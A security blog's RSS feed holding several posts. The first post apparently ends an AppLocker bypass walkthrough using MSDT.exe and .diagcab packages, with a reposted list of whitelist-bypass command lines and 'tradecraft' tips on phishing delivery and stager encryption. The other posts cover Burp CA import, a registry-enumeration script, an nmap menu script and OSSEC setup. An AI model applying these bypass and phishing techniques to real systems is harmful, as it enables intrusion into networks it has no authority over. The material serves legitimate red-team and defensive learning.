&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.42.25-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.42.25-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 9.42.25 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.43.02-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.43.02-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 9.43.02 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.43.38-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.43.38-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 9.43.38 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;Click Create -&gt; Yes to Default rules&lt;/blockquote&gt;

&lt;p&gt;At this point go ahead delete the Admin rule that allows and admin to execute any executable, your rules should match this:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.47.01-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.47.01-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 9.47.01 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Go ahead and setup the Script Rules and block out the temp dir:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.49.18-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.49.18-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 9.49.18 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Lets start up the required services needed for Applocker to enforce rules properly:
    sc config appIDSvc start= auto
    sc start appIDSvc&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.55.18-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.55.18-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 9.55.18 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Lastly we need to update our Group Policies. Reboot your box and run this (you may have to reboot first, if its domain auth you must have the DC on in your VM environment):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Gpupdatep /force
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So lets test out our new setup in Applocker, first I will attempt to run beacon.exe in my restricted environment:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-10.29.07-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-10.29.07-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 10.29.07 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Great this is exactly what we needed to see, now PS in this location:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-10.36.39-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-10.36.39-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 10.36.39 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Now lets test out our new package:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-10.38.10-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-10.38.10-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 10.38.10 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Boom! Now we have our payload and the ability to bypass AppLocker using some of the most restrictive settings. Now Nicholas Berthaume didn&amp;rsquo;t talk about this Applocker bypass (maybe I just missed this but this is a pretty sweet technique and all props go out to him)!&lt;/p&gt;

&lt;p&gt;By why does this work? Well we are actually using MSDT.exe to execute our .diagcab package. This is a Microsoft Signed binary which is inherently trusted by Windows! So we can now use this binary to gain code execution just like other App Bypasses using instal-util etc..&lt;/p&gt;

&lt;p&gt;If you don&amp;rsquo;t know much about application whitelist bypasses here is a great list of the current ones that SubTee put out:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/subTee/ApplicationWhitelistBypassTechniques/blob/master/TheList.txt&#34;&gt;https://github.com/subTee/ApplicationWhitelistBypassTechniques/blob/master/TheList.txt&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;1. IEExec -This technique may work in certain envirionments. Its relies on the fact that many organizations trust executables signed by Microsoft. We can misuse this trust by launching a specially crafted .NET application. Example Here: http://www.room362.com/blog/2014/01/16/application-whitelist-bypass-using-ieexec-dot-exe/
2. Rundll32.exe
3. ClickOnce Applications dfsvc.exe dfshim.dll
4. XBAP - XML Browser Applications WPF PresentationHost.exe    
5. MD5 Hash Collision
 http://www.mathstat.dal.ca/~selinger/md5collision/
6. PowerShell
 Specifically Reflective Execution
 http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/
 https://www.defcon.org/images/defcon-21/dc-21-presentations/Bialek/DEFCON-21-Bialek-PowerPwning-Post-Exploiting-by-Overpowering-Powershell.pdf
7. .HTA Application Invoke PowerShell Scripts
 Launched by mshta.exe, bypasses IE security settings as well.
8. bat, vbs, ps1
 1. cmd.exe /k &amp;lt; script.txt
 2. cscript.exe //E:vbscript script.txt
 3. Get-Content script.txt | iex
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Tradecraft Concerns:&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Phishing should work great, the .diagcab probably won&amp;rsquo;t be inspected by boarder protections? (let me know ppl)&lt;/li&gt;
&lt;li&gt;Code signing cert will need to look legit to the target (so keep that in mind)&lt;/li&gt;
&lt;li&gt;Powershell script can easily be pulled from the package, so use something encrypted for stager&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;I really hope you got something out of this! Let me know on twitter @Killswitch_gui what you think or ideas that you have, I love to learn from my peers so let me know what you think or are using this for. All credit for this goes out to:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=-E-JTYjk8_Q&#34;&gt;https://www.youtube.com/watch?v=-E-JTYjk8_Q&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Resources:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://technet.microsoft.com/en-us/library/ee424379.aspx&#34;&gt;https://technet.microsoft.com/en-us/library/ee424379.aspx&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Code Signing Help: &lt;a href=&#34;https://support.globalsign.com/customer/portal/articles/1353601-converting-certificates---openssl&#34;&gt;https://support.globalsign.com/customer/portal/articles/1353601-converting-certificates---openssl&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://msdn.microsoft.com/en-us/library/dd776530.aspxb&#34;&gt;https://msdn.microsoft.com/en-us/library/dd776530.aspxb&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Simple AppLocker Setup: &lt;a href=&#34;http://www.howtogeek.com/howto/6317/block-users-from-using-certain-applications-with-applocker/&#34;&gt;http://www.howtogeek.com/howto/6317/block-users-from-using-certain-applications-with-applocker/&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Importing Burp Suite CA cert .der into Kali for API testing</title>
      <link>http://dev.cybersyndicates.com/2015/10/importing-burp-suite-ca-cert-der-into-kali-for-api-testing/</link>
      <pubDate>Thu, 01 Oct 2015 15:15:53 +0000</pubDate>
      
      <guid>http://dev.cybersyndicates.com/2015/10/importing-burp-suite-ca-cert-der-into-kali-for-api-testing/</guid>
      <description>

&lt;h2 id=&#34;importing-burp-suite-ca&#34;&gt;Importing Burp Suite CA&lt;/h2&gt;

&lt;p&gt;Just recently I had to test some API calls with a custom tool written to work with RestClient, unfortunately RestClient uses OpenSSL to check the SSL against the known root CA. This throws a nice error, like invalid certificate error when trying to point your bash shell at the HTTP proxy like Burp. With tons of headache I really couldn&amp;rsquo;t find any good info on importing the SSL certs to Kali from burps CA export function.&lt;/p&gt;

&lt;p&gt;After a bit of research I did however find a few posts for each step, just no in one easy location. Sometimes I write these posts just for my own repository of headache fixes!&lt;/p&gt;

&lt;p&gt;Hope this helps some out, it will help me in the future:&lt;/p&gt;

&lt;h3 id=&#34;step-by-step-execution&#34;&gt;Step-By-Step Execution&lt;/h3&gt;

&lt;p&gt;In Burp go-to Proxy -&amp;gt; Options -&amp;gt; Export CA Certificate:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://cybersyndicates.com/wp-content/uploads/2015/10/Screen-Shot-2015-10-01-at-10.52.29-AM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-10-01-at-10.52.29-AM.png&#34; alt=&#34;Screen Shot 2015-10-01 at 10.52.29 AM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Save that cert to your Desktop or anywhere you want really. Now its time convert your cert from a .DER to a .PEM&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;openssl x509 -inform DER -outform PEM -in burpca.der -out myca.crt.pem
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Move cert:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;cp  myca.crt.pem /etc/ssl/certs/myca.crt.pem
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Go and run just for fun:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;update-ca-certificates
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt; Than add your HTTP proxy environmental variable for the RestClient to pick up, most CLI tools do check this for proxy information. This could be helpful for other tools as well.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;export http_proxy=http://127.0.0.1:8080/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt; At this point you should be up and running for the use of burp and your API you fuzz.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Windows Driver and Service enumeration with Python</title>
      <link>http://dev.cybersyndicates.com/2015/09/windows-driver-and-service-enumeration-with-python/</link>
      <pubDate>Thu, 17 Sep 2015 20:13:43 +0000</pubDate>
      
      <guid>http://dev.cybersyndicates.com/2015/09/windows-driver-and-service-enumeration-with-python/</guid>
      <description>&lt;p&gt;With malware becoming more and more sophisticated, it is becoming extremely difficult to identify malware on infected systems.  DLL hijacking, reflected DLL&amp;rsquo;s, and exploiting vulnerable kernel drivers has become extremely popular.  As it turns out Windows makes communication between user mode programs and kernel driver -1 this fairly easy for attackers:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;CreateFile() to initialize access to device through its symbolic ling

Communication w/ : DeviceloControl() // IOCTL call

WriteFile()            // pass &amp;quot;stream&amp;quot; data

ReadFile()            // recieve &amp;quot;stream&amp;quot; data

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Recent vulnerabilities such as OpenType Font Driver Vulnerability(CVE-2015-2426) are still making use of the ability to exploint DLL&amp;rsquo;s.  This particular vulnerability makes it possible for remote code execution by taking advantage of Window&amp;rsquo;s Adobe Type Manager Library improperly handling specially crafted OpenType fonts.  You can see why it is important to monitor and examine your Drivers, Services, and DLL&amp;rsquo;s.  I wrote a python module for our upcoming OFF-Toolkit (Offensive Forensics Toolkit) that facilitates that analyzing of Drivers and Services.  Some tidbits of information: Service Types are (&lt;strong&gt;normally&lt;/strong&gt;) 0x10, 0x20, 0x100: Start is 2, 3, or 4 ONLY.  Driver Type is 0x01 or 0x02; Start is 0 or 1 only..   Services w/o &amp;ldquo;ObjectName&amp;rdquo; that is set to LocalSystem, NT AUTHORITY\LocalService, or NT AUTHORITY\NetworkService&amp;hellip;. Services starting under the Svchost process must have an entry in SOFTWARE\Microsoft\Windows NT\CurrentVersion\svchost&amp;hellip;&lt;/p&gt;

&lt;p&gt;These are just a few things to keep in mind when analyzing data retrieved with this module.  For more information and for the source code, check it out at &lt;a href=&#34;https://github.com/slacker007/Registry_Enumerator/blob/master/DriversAndServices.py&#34;&gt;https://github.com/slacker007/Registry_Enumerator/blob/master/DriversAndServices.py&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;##############################################################################################################################
#                               				 OFFENSIVE FORENSIC FRAMEWORK   								   			 #
#											 (WINDOWS DRIVERS AND SERVICES FORENSICS MODULE)											 #
#											Compatible w/ Win 7,8,10 (x86 &amp;amp; 64)												 #
#												(MODIFIED ORIGINAL SEPT 2015)												   			 #
#															 BY 												   			 #
#					                           (slacker007) 					   			 				     #
##############################################################################################################################


######################################### Function &amp;amp; Variable Formatting Guide ###############################################
# Global Variables are all uppercase EX: GLOBAL_VARIABLE = 0
# local Variables are in all lowercase EX: local_variable = 0
# Function Names are written by capitalizing the first letter of each word EX: def FunctionName(): or def Function_Name():


import _winreg
import threading
import Queue
import time
from xml.dom import minidom
from pprint import pprint

#***********************************************************************************
# Global Variables
#***********************************************************************************

########################	Static Registry Keys	################################

SERVICES = r&#39;SYSTEM\\CurrentControlSet\\services&#39;

# List of Static Registry Keys: To add more keys just create a Variable up top with the same syntax and add the variable in this list.. And RUN!!
L_O_K = [SERVICES]

xml_file = open(&amp;quot;driversandservices.xml&amp;quot;, &amp;quot;w&amp;quot;)
xml_file.write(&amp;quot;&amp;lt;group name=\&amp;quot;DriversAndServices,\&amp;quot;&amp;gt;\n&amp;quot;)
q = Queue.Queue()

def get_MF_info(q, r):
	Iterate_Reg_Keys(_winreg.HKEY_LOCAL_MACHINE, r)

def doc_handler(x):
	xml_file.write(&amp;quot;&amp;lt;/group&amp;gt;&amp;quot;)
	xml_file.close()	

def Read_Subkeys (key): #(FUNCTION THAT READS OPENED HIVE KEY DATA INTO A //GENERATOR OBJECT//  TO REDUCE MEMORY FOOTPRINT!)
	counter = 0
	while True:
		try:
			subkey = _winreg.EnumKey(key, counter)
			yield subkey
			counter += 1
		except WindowsError as e:
			break
def Read_Key_Values (key): #(FUNCTION THAT READS THE VALUES OF AN OPENED SUBKEY USING A //GENERATOR OBJECT// TO REDUCE MEMORY FOOTPRINT!)
	counter = 0
	while True:
		try:
			keyvalue = _winreg.EnumValue(key, counter)
			yield keyvalue
			counter += 1
		except WindowsError as e:
			break
def Iterate_Reg_Keys(hkey, key_path, tabs=0): #(FUNCTION THAT CONTROLS THE ITERATION THROUGH SUBKEY &amp;amp; VALUES)
	key = _winreg.OpenKey(hkey, key_path, 0, _winreg.KEY_READ)
	for subkey_name in Read_Subkeys(key): #(LOOP THROUGH THE REGISTRY KEY AND OPEN EACH SUBKEY)
		xml_file.write(&amp;quot;\t&amp;lt;subkey name=\&amp;quot;&amp;quot;)
		xml_file.write(str(subkey_name))
		xml_file.write(&amp;quot;\&amp;quot;&amp;gt;\n&amp;quot;)
		subkey_path = &amp;quot;%s\\%s&amp;quot; % (key_path, subkey_name)
		Iterate_Reg_Keys(hkey, subkey_path, tabs+1)
		subkey_value_path = _winreg.OpenKey(hkey, subkey_path, 0, _winreg.KEY_READ)
		data_found = False
		for subkey_value in Read_Key_Values(subkey_value_path): #(LOOP THROUGTH THE SUBKEY TO PULL VALUES FROM SUBKEY)
			data_found = True
			if isinstance(subkey_value[1], str):
				try:
					converted_from_ascii = &amp;quot;:&amp;quot;.join(&amp;quot;{:02x}&amp;quot;.format(ord(c)) for c in subkey_value[1])
					value_data2 = str(converted_from_ascii)
				except UnicodeEncodeError:
					pass
			elif not isinstance(subkey_value[1], str):
				try:
					value_data2 = str(subkey_value[1])
				except UnicodeEncodeError:
					pass
			value_data1 = str(subkey_value[0])
			xml_file.write(&amp;quot;\t\t&amp;lt;id name=\&amp;quot;&amp;quot;)
			xml_file.write(str(value_data1))
			xml_file.write(&amp;quot;\&amp;quot;&amp;gt;&amp;quot;)
			xml_file.write(str(value_data2))
			xml_file.write(&amp;quot;&amp;lt;/id&amp;gt;\n&amp;quot;)
		xml_file.write(&amp;quot;	&amp;lt;/subkey&amp;gt;\n&amp;quot;)
	_winreg.CloseKey(key)

# Execution Control...................................................

for each in L_O_K:
	t = threading.Thread(target=get_MF_info, args = (q, each))
	t.start()
	t.join()
t = threading.Thread(doc_handler(xml_file))
t.start()
t.join
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;@real_slacker007&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Quick and Dirty NMAP Commandline Menu</title>
      <link>http://dev.cybersyndicates.com/2015/09/quick-and-dirty-nmap-commandline-menu/</link>
      <pubDate>Sat, 12 Sep 2015 02:34:47 +0000</pubDate>
      
      <guid>http://dev.cybersyndicates.com/2015/09/quick-and-dirty-nmap-commandline-menu/</guid>
      <description>&lt;p&gt;Quick and Dirty NMAP CommandLine Menu for enumerating hosts, ports, and services on a network.  Works against individual IP&amp;rsquo;s, IP ranges (x.x.x.0-50), and traditional CIDRs.  Outputs into separate files in the local directory.  Can be adjusted and scaled.  Any questions or assistance, feel free to email slacker007.dev@gmail.com or reply to post.  Check out the code on GIT.   &lt;a href=&#34;https://github.com/slacker007/simpleNMAP&#34;&gt;https://github.com/slacker007/simpleNMAP&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;********************************* Code Below *******************************&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;import os
import sys
import subprocess
chances = 4
end_prog = 0

def menu2(): 
    cidr = raw_input(&amp;quot;Please enter the network cider or IP to be scanned EX:192.168.1.0/16 or 10.10.1.4 &amp;quot;)
    return cidr
def menu1(chances): 
    print &amp;quot;\n(1) Host Discovery: &amp;quot;
    print &amp;quot;(2) Port &amp;amp; Service Discovery (top ports only): &amp;quot;
    print &amp;quot;(3) Port &amp;amp; Service Discovery (All 65536): &amp;quot; 
    print &amp;quot;(4) OS Discovery: &amp;quot;
    print &amp;quot;(5) RUN ALL \n&amp;quot;
    choice1 = raw_input(&amp;quot;What type of scan would you like to run? &amp;quot;)
if choice1 == &#39;3&#39;:
        print &amp;quot;\n******* If you are running this against a network range it will take a while! Best if used agaist a single IP or small range of addresses *******\n&amp;quot;
    if choice1 not in (&amp;quot;1&amp;quot;, &amp;quot;2&amp;quot;, &amp;quot;3&amp;quot;, &amp;quot;4&amp;quot;, &amp;quot;5&amp;quot;):
        if chances &amp;lt;= 1: 
            exit()
        chances = chances - 1
        print &amp;quot;Error, Please check your answer choice and try again: %d tries remaining: &amp;quot; % (chances)
        menu1(chances)
    else:
        print &amp;quot;Choice Successful&amp;quot; 
        return choice1
def menu3(chances, end_prog):
    if chances &amp;gt; 1:
        choice3 = raw_input(&amp;quot;would you like to run another scan? (y or n) &amp;quot;)
        choice3 = choice3.lower()
        if choice3 not in (&#39;y&#39;, &#39;n&#39;):
            print &amp;quot;*** INPUT ERROR, Please enter either y or n ***&amp;quot;
            chances = chances - 1
            menu3(chances, end_prog)
    if str(choice3) == &#39;n&#39;:
        exit()
def scanner(cidr, choice1, chances):
    if choice1 == &#39;1&#39;:
        subprocess.check_call([&#39;nmap&#39;, &#39;-n&#39;, &#39;-v&#39;, &#39;-PN&#39;, &#39;-sn&#39;, &#39;-PE&#39;, &#39;-PP&#39;, &#39;-T4&#39;, &#39;-ohostlist.UP&#39;, cidr])
    elif choice1 == &#39;2&#39;: 
        subprocess.check_call([&#39;nmap&#39;, &#39;-n&#39;, &#39;-v&#39;, &#39;-PN&#39;, &#39;-sV&#39;,&#39;-oservices2&#39;,cidr])  

    elif choice1 == &#39;3&#39;:
        subprocess.check_call([&#39;nmap&#39;, &#39;-n&#39;, &#39;-v&#39;, &#39;-PN&#39;, &#39;-sV&#39;, &#39;-p 1-65535&#39;, &#39;-oservices3&#39;, cidr])
    elif choice1 == &#39;4&#39;:
        subprocess.check_call([&#39;nmap&#39;, &#39;-n&#39;, &#39;-v&#39;, &#39;-Pn&#39;, &#39;-O&#39;, &#39;-oosversions&#39;, cidr])
    elif choice1 == &#39;5&#39;: 
        subprocess.check_call([&#39;nmap&#39;, &#39;-n&#39;, &#39;-v&#39;, &#39;-PN&#39;, &#39;-sn&#39;, &#39;-PE&#39;, &#39;-PP&#39;, &#39;-T4&#39;, &#39;-ohostlist.UP&#39;, cidr])
        subprocess.check_call([&#39;nmap&#39;, &#39;-n&#39;, &#39;-v&#39;, &#39;-PN&#39;, &#39;-sV&#39;, &#39;-p 1-65535&#39;, &#39;-oservices3&#39;, cidr])
        subprocess.check_call([&#39;nmap&#39;, &#39;-n&#39;, &#39;-v&#39;, &#39;-Pn&#39;, &#39;-O&#39;, &#39;-oosversions&#39;, cidr])
    else:
        return
while (1):
    choice1 = menu1(chances)
    cidr = menu2()
    scanner(cidr, choice1, chances)
    menu3(chances, end_prog)
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Advanced Active Monitoring with OSSEC</title>
      <link>http://dev.cybersyndicates.com/2015/06/advance-active-monitoring-with-ossec/</link>
      <pubDate>Sat, 20 Jun 2015 01:57:53 +0000</pubDate>
      
      <guid>http://dev.cybersyndicates.com/2015/06/advance-active-monitoring-with-ossec/</guid>
      <description>

&lt;p&gt;Tools Used For this tutorial.&lt;/p&gt;

&lt;p&gt;##############################################################&lt;/p&gt;

&lt;p&gt;OSSEC 2.8.2 (&lt;a href=&#34;http://www.ossec.net&#34;&gt;http://www.ossec.net&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;Ubuntu 14.04 (&lt;a href=&#34;http://www.ubuntu.com/download/desktop&#34;&gt;http://www.ubuntu.com/download/desktop&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;Gmail Account (&lt;a href=&#34;https://www.gmail.com&#34;&gt;https://www.gmail.com&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;Postfix (&lt;a href=&#34;http://www.postfix.org&#34;&gt;www.postfix.org&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;mailutils (installed from bash )&lt;/p&gt;

&lt;p&gt;##############################################################&lt;/p&gt;

&lt;p&gt;Step (1) Download Ubuntu 14.04 (Update: &lt;strong&gt;apt-get update; apt-get upgrade&lt;/strong&gt;)&lt;/p&gt;

&lt;p&gt;Step (2) Download OSSEC 2.8.2 Software&lt;/p&gt;

&lt;p&gt;Step(2b) OPTIONAL Download Web UI 0.8&lt;/p&gt;

&lt;p&gt;Step(3) Install OSSEC Software&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Two primary methods for installing OSSEC includes using the default settings (install.sh) or by manually installing it. Manual installation is simply just creating the required directories and copying the files into the OSSEC directory. Compiling each of the files and moving them to the appropriate directories. And lastly creating users and providing them with permissions to the files. Editing the install.sh script and/or the binaries can also be done to customize the install process. This is especially useful when configuring OSSEC for an unattended install, in which you will want to automate various aspects of the install to meet your environment needs.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;The method that will be used in this demonstration will be the default install, with additional configurations performed after installing.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;On your Ubuntu system, cd into the directory where you have downloaded the files and unpack them.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;strong&gt;tar –xzf ossec-hids-2.8.2.tar.gz&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Run the install.sh script and answer each of the questions.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;./install.sh&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;You’ll notice that during the question/answer video I selected “Server” as my choice. Although this will be the only system deployed for this post, it will still perform the same way. It just now gives you the option to add clients at a later time.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;[embed]&lt;a href=&#34;http://youtu.be/dbKrLRJLpRA[/embed&#34;&gt;http://youtu.be/dbKrLRJLpRA[/embed&lt;/a&gt;]&lt;/p&gt;

&lt;p&gt;[embed]&lt;a href=&#34;http://youtu.be/D_b5QI5ABsI[/embed&#34;&gt;http://youtu.be/D_b5QI5ABsI[/embed&lt;/a&gt;]&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Once OSSEC has been installed ensure that you allow the necessary communication for syslog traffic on your firewall. The default port is UDP 1514&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Primary Files For OSSEC&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt; &lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;**(path/on/your/system/ossec.conf) – &lt;strong&gt;This file is the primary configuration file for the OSSEC framework. The first section by default is a &amp;lt;global&lt;/strong&gt;&amp;gt; **tag that contains the parameters that specify the email notification address and SMTP server that OSSEC will use. Ensure that you have the 5 entries that are included in the screenshot below:&lt;/p&gt;

&lt;p&gt;&lt;email_notifications&gt; should be “yes”; This tells OSSEC that you want to receive alerts.&lt;/p&gt;

&lt;p&gt;&lt;Email_to&gt;should be &lt;a href=&#34;mailto:yourgmailaddress@gmail.com&#34;&gt;yourgmailaddress@gmail.com&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;smtp_server&gt;should be “localhost”;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;This setting is critical and it is COMPLETELY based off of your specific environment. For this test environment I am on a private network that is NAT’d, behind a firewall that is allowing outbound SMTP. It is important to fully understand the rules within your environment prior to implanting OSSEC if you wish to receive alerts outside of your network. Also keep in mind that many ISP’s now block SMTP and in that case it is best to use the one they provide for you. A few Google searches should answer that question for you, and if that is the case then wherever you see us use gmail, supplement the SMTP-RELAY-SERVER for your ISP.   For this test we will be using gmail as our (SMTP-RELAY-SERVER) and (localhost(which will be POSTFIX)) as our internal SMTP-SERVER. So basically OSSEC will generate an alert and send it to POSTFIX, which will then send it to whichever SMTP-RELAY-SERVER(gmail for this example), and from there it will be delivered to the email address in the &lt;email_to&gt; tag field. If you’re new to OSSEC, Linux, &amp;amp;/or PostFix you’re probably wondering why not just input gmail’s SMTP-RELAY-ADDRESS in the &lt;smtp_server&gt; tag field and cut out the middleman (PostFix). The reason why Postfix is used is that it is much better suited for handling emails. It handles encryption, transmission, &amp;amp; authentication much better than OSSEC does. Not to say that OSSEC couldn’t provide this functionality because after all it is Open Source, therefore whatever it lacks can always be written into it. Another reason is the separation of duties/functions. Its best practice to separate roles whenever possible and to limit the amount of services that are nested.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;email_from&gt; can be whatever email you’d like to appear in the “From” line (&lt;strong&gt;NOW YOU SEE WHY MANY ISP’S BLOCK SMTP)&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;email_maxperhour&gt; you will have to add this line yourself, but it is important if you are using a free SMTP-RELAY-SERVICE. Many of them have a threshold for the amount of emails that they’ll relay per day. This number is up to you and can be anywhere from **1 – 9999 **messages per hour. Keep in mind that this is only the cap on the amount o f emails that are sent per hour and does not stop OSSEC from generating alerts that remain on the Server itself.&lt;/p&gt;

&lt;p&gt; &lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/OssecEmailSettings.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/OssecEmailSettings-300x203.png&#34; alt=&#34;OssecEmailSettings&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The next section of this file is the &lt;include&gt; tag field which is used to include separate files that contain rules for OSSEC&lt;/p&gt;

&lt;p&gt;Further down in this file there is a &lt;syscheck&gt; segment that dictates how often the file systems will be checked. The default setting is 79200 seconds (22 hours) You can adjust this time based off your unique environmental needs.&lt;/p&gt;

&lt;p&gt;In addition to the frequency of the syscheck, you can also dictate which files to check and which to ignore.&lt;/p&gt;

&lt;p&gt;The &lt;rootcheck&gt; tag field is also included in this file. This area should not be altered at this time. There will be another post in the near future in which we will discuss custom configuration for rootkit identification based on current indicators of compromise.&lt;/p&gt;

&lt;p&gt;The &lt;alerts&gt; tag field contains two important fields: log_alert_levels (what is the min level of alert you wish to be logged) &amp;amp; email_alert_levels(min level of alerts that you wish to be sent immediately to your monitored email account) These fields are configurable based on your risk versus noise tolerance from **1-10. **&lt;/p&gt;

&lt;p&gt;&lt;strong&gt; &lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The last tag field that we will discuss in this file will be the &lt;active-response&gt; tag field. The two fields within this section that will be important for us will be the &lt;level&gt; tag and the &lt;timeout&gt; tag. The           &amp;lt; level&amp;gt; tag will be set based off your unique environment’s risk tolerance and IR response time. The &lt;timeout&gt; tag is critical and should be set carefully. The number by default is 600 (seconds) and will automatically respond to network based alerts by blocking the IP for the length of time you specify. This can be tricky because if your IR response time is slow then you would ideally want to block for a length of time that supports their responsiveness so that they can be effective. What makes this the tricky part is that too short of a lockout gives the attacker more time to compromise a system or exfiltrate data before your IR team has time to react but too long and a legitimate system may be locked out which could degrade production.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;decoder.xml&lt;/strong&gt;&lt;/p&gt;

